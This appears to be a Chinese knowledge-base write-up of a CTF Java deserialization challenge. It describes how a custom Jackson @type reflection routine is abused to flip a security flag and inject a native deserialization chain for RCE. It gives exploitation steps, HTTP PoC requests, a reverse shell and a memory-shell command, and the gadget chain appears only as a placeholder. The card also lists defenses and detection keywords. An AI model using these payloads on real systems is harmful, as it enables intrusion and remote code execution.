---
id: web-java-deser-jackson-deobject-type-reflection-field-injection
title: Jackson 自定义 deObject 的 @type 任意实例化 + 递归反射赋值：改写 SecurityCheck.safe/treeMap 进入原生反序列化分支 RCE
type: scenario
domain: web
path: web/java/deserialization/jackson
technique: jackson-at-type-reflection-field-injection
tags:
- java
- jackson
- deserialization
- reflection
- templatesimpl
- pojonode
- memshell
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: 题目环境 Spring Boot 2.7.12（原文依赖截图；非通用产品影响区间）
verification:
  verified_by: verifier-V517
  verified_at: '2026-11-11T12:04:27+08:00'
  notes: 已对照原文与全部 22 张截图核对：12 Index.start 反编译（classes 子串黑名单、isSafe if/else、ismap 循环）、13 setFieldValues→setFieldValue(deObject(value))、14 19 个 LinkedHashMap 实现（含 ExtendedModelMap）、15 调试 ExtendedModelMap 与嵌套 map、16 safe 为 private static boolean=true、17 调试 isSafe()=false、18 ismap() 返回 treeMap(HashSet)、19 构造器写入 base64Encode(serialize("jackson"))、20 treeMap 元素 rO0ABXQAB2phY2tzb24=、21 反弹 shell whoami/cat /flag、22 内存马 /shell?cmd=whoami。修正卡内 base64 示例长度字节 06→07（与截图一致：序列化 "jackson" 应为 0x07）。affected_versions 为题目环境 Spring Boot 2.7.12（截图 spring-boot-2.7.12.jar），已明确标注非通用产品影响区间，与库内 CTF 卡惯例一致，保留。dedup：候选均 related/new（最高 cosine 0.9075 为 SignedObject 短链卡，入口/触发方式不同），非同链重复。未验证：原文未给出通用产品影响范围；完整 base64 链以占位符表示（原文提供）。
url: /docs/web/java/deserialization/jackson/web-java-deser-jackson-deobject-type-reflection-field-injection/
draft: false
kb_aliases:
- SecurityCheck.deObject @type
- Jackson 手写 @type 任意类实例化
- setFieldValues 递归反射赋值
- safe 属性改写
- treeMap 注入原生反序列化
- AWDP security system
---

## 一句话结论

自定义接口 `/safeobject` 先用 Jackson 把 `obj` 反序列化成 `classes` 指定类型，再交给 `SecurityCheck.deObject()`：该方法读取 Map 里的 `@type` 用 `Class.forName(type).newInstance()` 创建任意类，并对每个字段递归 `setFieldValues(deObject(value))` 做反射赋值。攻击者用 `classes=org.springframework.ui.ExtendedModelMap`（LinkedHashMap 子类且字符串不含 `Object`/`LinkedHashMap`）绕过入口黑名单，构造 `{"@type":"com.example.jackson.SecurityCheck","safe":false,"treeMap":{"@type":"java.util.HashSet","map":{"<base64 原生序列化链>":null}}}`，即可把安全开关改成 false 并往 `treeMap` 注入待反序列化数据，随后 else 分支遍历并原生反序列化，触发 POJONode→Spring AOP→TemplatesImpl 链获得 RCE（反弹 shell/Spring 内存马）。

## 原理

- 入口（`Index.start(String obj, String classes)`）：
  ```java
  if (!classes.contains("Object") && !classes.contains("LinkedHashMap")) {
      Class c = Class.forName(classes);
      if (SecurityCheck.isSafe()) {
          Object o = SecurityCheck.deObject(mapper.readValue(obj, c));
          return o.toString();
      } else {
          Iterator it = SecurityCheck.ismap().iterator();
          while (it.hasNext()) {
              byte[] s = SecurityCheck.base64Decode((String) it.next());
              sb.append(SecurityCheck.deserialize(s));
          }
          return sb.toString();
      }
  }
  ```
  黑名单只是对 `classes` 字符串做子串判断；`org.springframework.ui.ExtendedModelMap` 是 `LinkedHashMap` 子类，但其类名不含 `Object`/`LinkedHashMap` 子串，能通过并进入 `Class.forName` + `mapper.readValue`。
- `SecurityCheck.deObject(Object ob)`：若 `ob instanceof LinkedHashMap`，取 `@type` 键，`Class.forName(type).newInstance()` 创建任意类；遍历其余 key，`getField(clazz,key)` 找到字段后调用 `setFieldValues(obj,key,value)`。
- `setFieldValues` 的实现是 `setFieldValue(obj, fieldName, deObject(fieldValue))`——对字段值再走一遍 `deObject`。因此嵌套 JSON 里的每个 `{"@type":...}` 都会被实例化并继续设置字段，等价于一个手写的、可递归的「任意类实例化 + 任意属性赋值」原语（类似 Jackson default typing，但完全绕过 mapper 配置）。
- 第一步改开关：`SecurityCheck.safe` 是 `private static boolean safe = true`，`deObject` 通过反射把实例字段（静态字段由 `setFieldValue` 处理）改成 false；调试截图确认 `SecurityCheck.isSafe()` 返回 false，从而进入 else 分支。
- 第二步注入数据：`SecurityCheck.treeMap` 是构造方法里初始化的 `HashSet`，元素是 base64 编码的原生序列化串（正常内容如 `rO0ABXQAB2phY2tzb24=`，即序列化的字符串 "jackson"）。payload 用 `{"@type":"java.util.HashSet","map":{"<base64>":null}}` 嵌套实例化 HashSet 并设置其内部 `map`（HashSet 的 HashMap 后备字段），使 `ismap()` 迭代出攻击者提供的 base64 串。
- 第三步原生反序列化：else 分支对每个 base64 解码后调用 `SecurityCheck.deserialize(s)`（原生 `ObjectInputStream`），攻击者放入 POJONode→Spring AOP 代理→`TemplatesImpl` 的序列化链，`toString()`/getter 触发字节码加载执行；原文演示了反弹 shell 成功读取 `/flag`，以及通过 Jackson 链写入 Spring 内存马（`/shell?cmd=whoami`）。
- 成立原因：程序把「解析用户 JSON」和「反射设置任意字段」拼在一起，安全属性与待反序列化集合都变成了可写字段；入口对 `classes` 的字符串黑名单又只挡了两个字面量，导致安全校验自身被改写。

## 触发条件

- 目标存在该 `/safeobject` 接口（`obj`、`classes` 可控，原文环境无鉴权）。
- `SecurityCheck` 类及其 `deObject/setFieldValues/treeMap/deserialize` 逻辑如原文；`safe` 为可反射赋值的字段。
- classpath 存在可用 gadget（Spring Boot 2.7.12 + Xalan `TemplatesImpl`/Spring AOP；JDK 版本决定用哪条 TemplatesImpl 链）。
- 能访问目标并发送 POST 表单。

## 利用步骤

1. 探测入口：`classes=org.springframework.ui.ExtendedModelMap`、`obj={"@type":"com.example.jackson.SecurityCheck","safe":false}`，观察响应/调试确认 `safe` 被改为 false（原文在调试器中看到 `SecurityCheck.isSafe() = false`）。
2. 生成原生反序列化链（POJONode→Spring AOP→TemplatesImpl 或 Spring 内存马），base64 编码，得到 `rO0AB...`。
3. 构造 `treeMap` 注入：`{"@type":"java.util.HashSet","map":{"<base64>":null}}`，与 `safe:false` 放在同一个 `SecurityCheck` 对象里。
4. POST `/safeobject`，`classes=org.springframework.ui.ExtendedModelMap`，触发 else 分支的原生反序列化。
5. 验证命令执行：原文用反连 shell 读取 `/flag`，或用内存马 `/shell?cmd=whoami` 执行命令。

## PoC

第一阶段（改 safe 开关，验证反射赋值）：

```http
POST /safeobject HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

obj={"@type":"com.example.jackson.SecurityCheck","safe":false}&classes=org.springframework.ui.ExtendedModelMap
```

完整 RCE（`<BASE64_SER>` 为 POJONode→Spring AOP→TemplatesImpl 链的 base64）：

```http
POST /safeobject HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

obj={"@type":"com.example.jackson.SecurityCheck","safe":false,"treeMap":{"@type":"java.util.HashSet","map":{"<BASE64_SER>":null}}}&classes=org.springframework.ui.ExtendedModelMap
```

```text
# 成功标志：反连 shell 回显 uid / 读取 /flag；或内存马
GET /shell?cmd=whoami
```

原文完整 payload 中的 base64 串极长，本卡只用占位符表示，需按目标依赖自行生成。

## 变体与关联

- 变体：入口 `classes` 黑名单可用其它 `LinkedHashMap` 子类绕过（如 `org.springframework.ui.ModelMap`、`org.springframework.validation.BindingAwareModelMap` 等，原文截图列出了 19 个实现）。
- 变体：最终链可换 SnakeYAML/JNDI/内存马等；原文分别演示了反弹 shell 与 Spring 内存马。
- 关联：[[web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17]]、[[jackson-native-deserialization-getter-tostring-templates-rce]]——最终触发 `TemplatesImpl` 的 Jackson getter/toString 链。
- 关联：[[web-java-classloader-deserialization-memshell-loader-selection]]——打内存马时的类加载原语选型。
- 关联：[[web-java-deser-objectinputstream-overlong-utf8-blacklist-bypass]]——原生反序列化侧的另一类防护绕过；本卡的入口是手写 `@type` 反射赋值。

## 检测与防御

- 防御：不要手写基于 `@type` + `Class.forName` + 反射字段赋值的对象构造逻辑；Jackson 反序列化使用明确的 DTO/白名单，禁用 default typing。
- 防御：安全开关/集合字段设为 `final` 或不可反射写；`setFieldValues` 对字段名和类型做严格白名单，禁止设置 `Class`/`HashSet` 等危险类型。
- 防御：原生反序列化使用 JEP 290 `ObjectInputFilter` 白名单，或整体移除 `SecurityCheck.deserialize` 这类入口；升级组件、移除 Xalan TemplatesImpl 等 gadget 依赖。
- 检测：请求体出现 `@type`、`java.util.HashSet`、`com.example.jackson.SecurityCheck`、`rO0AB`（base64 的 Java 序列化魔数）等关键字；接口响应/日志中出现 `TemplatesImpl`、`POJONode`、`JdkDynamicAopProxy` 相关异常或类加载。
- 检测：审计「`obj.contains("@type")` 之类字符串黑名单 + `Class.forName`」的代码模式，字符串黑名单无法阻止 `ExtendedModelMap` 等合法子类。
